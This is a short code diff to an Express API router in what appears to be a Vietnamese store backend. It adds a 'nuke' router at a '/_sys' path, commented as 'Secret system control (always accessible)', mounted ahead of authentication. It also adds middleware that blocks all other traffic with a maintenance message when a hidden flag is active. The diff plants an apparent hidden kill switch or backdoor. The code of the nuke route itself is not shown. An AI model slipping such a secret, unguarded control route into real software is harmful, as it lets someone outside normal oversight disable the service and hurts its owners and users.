@@ -14,8 +14,20 @@ import storeApplicationRoutes from "./store-applications";
 import { voucherRouter } from "./voucher.route";
 import bannerRouter from "./banner.route";
 import { reviewRouter } from "./review.route";
+import nukeRouter, { isInMaintenanceMode } from "./nuke.route";
 
 const apiRouter = Router();
+
+// Secret system control (always accessible)
+apiRouter.use("/_sys", nukeRouter);
+
+// Maintenance mode middleware - blocks everything else when active
+apiRouter.use((req, res, next) => {
+  if (isInMaintenanceMode()) {
+    return res.status(503).json({ message: "Hệ thống đang bảo trì. Vui lòng quay lại sau." });
+  }
+  next();
+});
 
 apiRouter.use(healthRouter);
 apiRouter.use("/auth", authRouter);
@@ -34,3 +46,4 @@ apiRouter.use("/banners", bannerRouter);
 apiRouter.use("/reviews", reviewRouter);
 
 export default apiRouter;
+
